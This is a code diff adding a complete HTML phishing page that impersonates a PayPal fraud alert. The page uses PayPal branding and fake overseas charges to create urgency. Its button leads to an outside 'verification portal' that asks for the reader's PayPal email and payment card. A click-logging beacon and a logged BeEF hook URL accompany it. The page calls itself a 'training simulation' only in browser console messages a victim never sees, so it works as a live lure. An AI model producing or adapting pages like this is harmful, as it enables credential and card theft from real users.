@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Security Alert - Unauthorized Transactions Detected</title>
+    <link href="https://www.paypalobjects.com/webstatic/icon/pp258.png" rel="shortcut icon" type="image/x-icon">
+    <style>
+        /* PayPal-like styling */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            line-height: 1.42857;
+            color: #333;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .security-container {
+            background-color: #ffffff;
+            border: 1px solid #e1e1e1;
+            border-radius: 4px;
+            max-width: 700px;
+            margin: 40px auto;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+        .header {
+            background: linear-gradient(90deg, #003087 0%, #009cde 100%);
+            padding: 25px 40px;
+            color: white;
+        }
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .paypal-logo {
+            height: 40px;
+            width: auto;
+            margin-right: 15px;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        .content {
+            padding: 40px;
+        }
+        .urgent-alert {
+            background-color: #fff8e5;
+            border: 1px solid #ffeaa7;
+            border-left: 4px solid #ffc107;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 0 0 30px 0;
+            color: #856404;
+        }
+        .urgent-alert h2 {
+            margin-top: 0;
+            color: #856404;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .incident-box {
+            background-color: #f8f9fa;
+            border: 1px solid #e1e1e1;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .incident-number {
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            color: #003087;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+        .transaction-list {
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid #e1e1e1;
+        }
+        .transaction-item {
+            padding: 15px;
+            border-bottom: 1px solid #e1e1e1;
+            margin-bottom: 10px;
+        }
+        .transaction-item:last-child {
+            border-bottom: none;
+        }
+        .amount {
+            color: #d50000;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .instructions {
+            background-color: #e8f4fd;
+            border-radius: 6px;
+            padding: 25px;
+            margin: 30px 0;
+            border-left: 4px solid #0070e0;
+        }
+        .instructions ol {
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin-bottom: 12px;
+            padding-left: 8px;
+        }
+        .verify-button {
+            display: inline-block;
+            background: linear-gradient(90deg, #0070e0 0%, #0054b1 100%);
+            color: #ffffff;
+            padding: 16px 40px;
+            text-decoration: none;
+            border-radius: 100px;
+            font-weight: 600;
+            font-size: 17px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 112, 224, 0.2);
+        }
+        .verify-button:hover {
+            background: linear-gradient(90deg, #0054b1 0%, #003087 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 84, 177, 0.3);
+            text-decoration: none;
+        }
+        .action-section {
+            text-align: center;
+            margin: 40px 0;
+            padding: 30px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            border-top: 3px solid #003087;
+        }
+        .footer {
+            background-color: #f8f9fa;
+            padding: 30px 40px;
+            border-top: 1px solid #e1e1e1;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer-links {
+            margin-bottom: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .footer-links a {
+            color: #0070e0;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .security-notice {
+            background-color: #fff;
+            border: 1px solid #e1e1e1;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+        }
+        .highlight {
+            background-color: #fff3cd;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: 600;
+        }
+        /* Fix for button click tracking */
+        .verify-button.clicked {
+            background: linear-gradient(90deg, #28a745 0%, #1e7e34 100%);
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="paypal-logo">
+                <h1>Fraud Prevention Alert</h1>
+            </div>
+            <p style="margin: 5px 0 0 0; opacity: 0.9;">Unauthorized Transaction Investigation</p>
+        </div>
+        <div class="content">
+            <p><strong>Dear Valued Customer,</strong></p>
+            <p>Our Fraud Prevention Department has noted several suspicious transactions on your account originating from multiple overseas merchants.</p>
+            <div class="incident-box">
+                <p style="margin: 0 0 10px 0;"><strong>Incident Reference:</strong></p>
+                <div class="incident-number">FRDR-2039423990</div>
+                <p style="margin: 15px 0 0 0; font-size: 13px; color: #666;">Created: Today at UTC 14:58 | Status: Investigation Active</p>
+            </div>
+            <p>Our policy states that we require your assistance in determining the legitimacy of any suspicious charges totalling <span class="amount">$5,000.00 USD</span>.</p>
+            <div class="transaction-list">
+                <h3 style="margin-top: 0; color: #003087;">Suspicious Transactions Detected</h3>
+                <div class="transaction-item">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong>Electronic Store Ltd.</strong><br>
+                            <span style="font-size: 13px; color: #666;">Hong Kong • Today at UTC 9:30</span>
+                        </div>
+                        <div class="amount">$1,500.00 USD</div>
+                    </div>
+                </div>
+                <div class="transaction-item">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong>Global Tech Imports</strong><br>
+                            <span style="font-size: 13px; color: #666;">Singapore • Today at UTC 11:42</span>
+                        </div>
+                        <div class="amount">$1,875.00 USD</div>
+                    </div>
+                </div>
+                <div class="transaction-item">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong>Digital Market Solutions</strong><br>
+                            <span style="font-size: 13px; color: #666;">Amsterdam • Today at UTC 13:20</span>
+                        </div>
+                        <div class="amount">$1,875.00 USD</div>
+                    </div>
+                </div>
+                <div style="padding: 15px; background: white; border-radius: 4px; margin-top: 15px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; font-weight: bold;">
+                        <div>Total Suspicious Charges:</div>
+                        <div class="amount">$5,250.00 USD</div>
+                    </div>
+                </div>
+            </div>
+            <div class="instructions">
+                <h3 style="margin-top: 0; color: #0070e0;">Required Action Steps</h3>
+                <p>To help us investigate and prevent these unauthorized charges, please follow these steps:</p>
+                <ol>
+                    <li><strong>Click the button below</strong> to access our secure verification portal</li>
+                    <li><strong>Verify your account information</strong> to confirm your identity</li>
+                    <li><strong>Review each suspicious transaction</strong> shown with merchant, date and amount details</li>
+                    <li><strong>Validate transactions</strong> as suspicious or unknown to the best of your ability</li>
+                    <li><strong>Denote all charges</strong> you wish to dispute for immediate action</li>
+                </ol>
+                <p>Your information is very important to us. We appreciate your cooperation. A representative will be contacting you shortly regarding this matter.</p>
+            </div>
+            <div class="action-section">
+                <p style="margin-bottom: 25px; font-size: 16px;">
+                    <strong>Time is critical.</strong> Please verify your account within the next 24 hours to prevent these transactions from being processed.
+                </p>
+                <!-- FIXED LINK - Using absolute URL -->
+                <a href="https://globalverification.site/paypal_login.php" class="verify-button" id="verifyLink">
+                    🔒 Access Secure Verification Portal
+                </a>
+                <p style="margin-top: 25px; font-size: 13px; color: #666;">
+                    <span class="highlight">Estimated time:</span> 2-3 minutes<br>
+                    <span class="highlight">Required:</span> PayPal email and payment card for verification
+                </p>
+            </div>
+            <div style="background-color: #f8f9fa; padding: 20px; border-radius: 6px; margin-top: 30px;">
+                <p style="margin: 0; font-size: 13px; color: #666;">
+                    <strong>Why am I being asked to verify?</strong><br>
+                    This is a security measure to ensure that only authorized users can review and dispute transactions. By verifying your account, you help us prevent fraudulent activity and protect your funds.
+                </p>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="https://www.paypal.com/security" target="_blank">Security Center</a>
+                <a href="https://www.paypal.com/privacy" target="_blank">Privacy Policy</a>
+                <a href="https://www.paypal.com/legal" target="_blank">Legal Agreements</a>
+                <a href="https://www.paypal.com/help" target="_blank">Help & Contact</a>
+                <a href="https://www.paypal.com/fees" target="_blank">Fees</a>
+                <a href="https://www.paypal.com/choices" target="_blank">Your Choices</a>
+            </div>
+            <p>
+                Please do not reply to this email. We're unable to respond to inquiries sent to this address. For immediate answers to your questions, visit our <a href="https://www.paypal.com/help" style="color: #0070e0;">Help Center</a>.
+            </p>
+            <div class="security-notice">
+                <p style="margin: 0 0 10px 0;">
+                    <strong>PayPal Fraud Prevention Tip:</strong><br>
+                    PayPal will never ask for your password or security questions in an email. Always ensure you're on <strong>https://www.paypal.com</strong> before entering sensitive information.
+                </p>
+                <p style="margin: 0; font-size: 10px;">
+                    PPID: 3K47H9J2L | TRX: #PP-004-789-123-456<br>
+                    Email ID: PAYPAL-SECURITY-20251205 | Incident: FRDR-2039423990
+                </p>
+            </div>
+            <p style="margin-top: 20px; font-size: 11px; color: #999;">
+                Copyright © 1999-2025 PayPal, Inc. All rights reserved.<br>
+                PayPal, 2211 N. First St., San Jose, CA 95131
+            </p>
+        </div>
+    </div>
+    <script>
+        // Educational message ONLY in console
+        console.log('%c⚠️ SECURITY TRAINING SIMULATION ⚠️', 'color: #dc3545; font-size: 16px; font-weight: bold;');
+        console.log('This is a simulated phishing page for authorized penetration testing.');
+        console.log('All data captured is for educational purposes only.');
+        console.log('=============================================');
+        
+        // Track page visit
+        console.log('[Training] Landing page loaded: ' + new Date().toLocaleString());
+        console.log('[Training] Incident: FRDR-2039423990');
+        console.log('[Training] This page would lure victims to click the verification link');
+        
+        // Track button clicks
+        document.getElementById('verifyLink').addEventListener('click', function(e) {
+            console.log('[Training] User clicked verification link');
+            console.log('[Training] Redirecting to: ' + this.href);
+            
+            // Optional: Visual feedback
+            this.classList.add('clicked');
+            this.innerHTML = '⏳ Redirecting...';
+            
+            // Log the click (optional AJAX call)
+            try {
+                navigator.sendBeacon('/log_click.php', JSON.stringify({
+                    action: 'verification_link_click',
+                    time: new Date().toISOString(),
+                    referrer: document.referrer
+                }));
+            } catch (e) {
+                // Silent fail
+            }
+        });
+        
+        // Simulate BeEF hook (for training)
+        setTimeout(() => {
+            console.log('[Training] Simulated BeEF hook: https:companyneweb.site/paypal_index.html:3000/hook.js');
+            console.log('[Training] Session: ' + Math.random().toString(36).substr(2, 9));
+        }, 2000);
+    </script>
+</body>
+</html>
